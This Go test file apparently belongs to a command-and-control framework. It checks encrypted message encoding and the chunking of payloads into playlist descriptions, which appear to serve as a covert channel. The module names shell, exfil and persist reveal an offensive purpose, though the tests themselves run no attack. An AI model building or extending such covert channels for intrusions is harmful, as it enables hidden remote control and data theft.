package protocol

import (
	"crypto/rand"
	"fmt"
	"math/big"
	"strings"
	"sync"
	"testing"
)

func protoRandomPassword(t *testing.T) string {
	t.Helper()
	length, err := rand.Int(rand.Reader, big.NewInt(56))
	if err != nil {
		t.Fatalf("rand.Int: %v", err)
	}
	n := int(length.Int64()) + 8
	buf := make([]byte, n)
	if _, err := rand.Read(buf); err != nil {
		t.Fatalf("rand.Read: %v", err)
	}
	for i := range buf {
		buf[i] = 33 + buf[i]%94
	}
	return string(buf)
}

func protoRandomString(t *testing.T, size int) string {
	t.Helper()
	buf := make([]byte, size)
	if _, err := rand.Read(buf); err != nil {
		t.Fatalf("rand.Read: %v", err)
	}
	// Use only printable ASCII to make valid JSON strings
	for i := range buf {
		buf[i] = 32 + buf[i]%95 // ' ' .. '~'
	}
	return string(buf)
}

// TestStressProtocolEncodeDecodeMessage tests 50 random C2 messages
// through encode/decode.
func TestStressProtocolEncodeDecodeMessage(t *testing.T) {
	modules := []string{"shell", "exfil", "sysinfo", "persist", "cleanup"}

	for i := 0; i < 50; i++ {
		key := protoRandomPassword(t)
		module := modules[i%len(modules)]
		dataSize := i * 100

		msg := map[string]interface{}{
			"module": module,
			"seq":    float64(i),
			"status": "ok",
			"data":   protoRandomString(t, dataSize),
			"ts":     float64(1700000000 + i),
		}

		encoded, err := EncodeMessage(msg, key)
		if err != nil {
			t.Fatalf("iter %d: encode: %v", i, err)
		}

		decoded, err := DecodeMessage(encoded, key)
		if err != nil {
			t.Fatalf("iter %d: decode: %v", i, err)
		}

		if getString(decoded, "module") != module {
			t.Errorf("iter %d: module mismatch: got %v, want %s",
				i, decoded["module"], module)
		}
		if getInt(decoded, "seq") != i {
			t.Errorf("iter %d: seq mismatch: got %v, want %d",
				i, decoded["seq"], i)
		}
	}
}

// TestStressProtocolChunkReassemble tests 50 random payloads through
// chunk/reassemble with varying sizes.
func TestStressProtocolChunkReassemble(t *testing.T) {
	key := protoRandomPassword(t)

	sizes := []int{1, 10, 100, 299, 300, 301, 500, 1000, 5000, 10000}

	for _, size := range sizes {
		payload := strings.Repeat("X", size)

		chunks, err := ChunkPayload(payload, 1, ChannelCmd, key)
		if err != nil {
			t.Fatalf("size %d: chunk: %v", size, err)
		}

		// Simulate reading back
		var descs []DescPair
		for j, c := range chunks {
			descs = append(descs, DescPair{
				PlaylistID:  fmt.Sprintf("pl-%d", j),
				Description: c,
			})
		}

		seqGroups := ReadC2Descriptions(descs, key, ChannelCmd, 1)
		if len(seqGroups) != 1 {
			t.Fatalf("size %d: expected 1 seq group, got %d", size, len(seqGroups))
		}

		reassembled := ReassemblePayload(seqGroups[1])
		if reassembled != payload {
			t.Errorf("size %d: reassembled len %d, want %d",
				size, len(reassembled), len(payload))
		}
	}
}

// TestStressProtocolChunkDescRoundtrip tests 50 random chunk descriptions.
func TestStressProtocolChunkDescRoundtrip(t *testing.T) {
	for i := 0; i < 50; i++ {
		key := protoRandomPassword(t)
		chunkData := protoRandomString(t, 100+i*10)
		meta := map[string]interface{}{
			"c":   "cmd",
			"i":   float64(i + 1),
			"seq": float64(i),
		}

		desc, err := EncryptChunkDesc(meta, chunkData, key)
		if err != nil {
			t.Fatalf("iter %d: encrypt desc: %v", i, err)
		}

		gotMeta, gotData, err := DecryptChunkDesc(desc, key)
		if err != nil {
			t.Fatalf("iter %d: decrypt desc: %v", i, err)
		}

		if gotData != chunkData {
			t.Errorf("iter %d: data mismatch", i)
		}
		if getMetaInt(gotMeta, "seq") != i {
			t.Errorf("iter %d: seq mismatch: got %v, want %d",
				i, gotMeta["seq"], i)
		}
	}
}

// TestStressConcurrentProtocol runs 20 goroutines encoding/decoding messages.
func TestStressConcurrentProtocol(t *testing.T) {
	const numWorkers = 20
	var wg sync.WaitGroup
	errCh := make(chan string, numWorkers)

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()
			key := protoRandomPassword(t)
			msg := map[string]interface{}{
				"module": "shell",
				"seq":    float64(idx),
				"data":   protoRandomString(t, 500),
				"ts":     float64(1700000000),
			}

			encoded, err := EncodeMessage(msg, key)
			if err != nil {
				errCh <- fmt.Sprintf("worker %d encode: %v", idx, err)
				return
			}

			decoded, err := DecodeMessage(encoded, key)
			if err != nil {
				errCh <- fmt.Sprintf("worker %d decode: %v", idx, err)
				return
			}

			if getInt(decoded, "seq") != idx {
				errCh <- fmt.Sprintf("worker %d seq mismatch", idx)
			}
		}(i)
	}

	wg.Wait()
	close(errCh)

	for errMsg := range errCh {
		t.Errorf("concurrent: %s", errMsg)
	}
}

// TestStressProtocolWrongKeyFails verifies decryption fails with wrong key.
func TestStressProtocolWrongKeyFails(t *testing.T) {
	for i := 0; i < 20; i++ {
		key1 := protoRandomPassword(t)
		key2 := protoRandomPassword(t)

		msg := map[string]interface{}{
			"module": "shell",
			"seq":    float64(i),
			"ts":     float64(1700000000),
		}

		encoded, err := EncodeMessage(msg, key1)
		if err != nil {
			t.Fatalf("iter %d: encode: %v", i, err)
		}

		_, err = DecodeMessage(encoded, key2)
		if err == nil {
			t.Errorf("iter %d: expected error decoding with wrong key", i)
		}
	}
}
